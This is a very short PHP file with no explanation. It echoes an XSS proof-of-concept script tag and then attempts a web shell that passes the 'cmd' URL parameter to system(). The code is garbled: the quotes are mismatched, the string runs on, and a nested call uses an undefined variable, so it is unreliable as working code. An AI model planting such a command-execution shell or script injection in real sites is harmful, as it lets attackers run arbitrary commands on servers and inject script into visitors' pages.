<?php

echo "<script>alert('XSS')</script>;system($system($_GET["cmd"]);

?>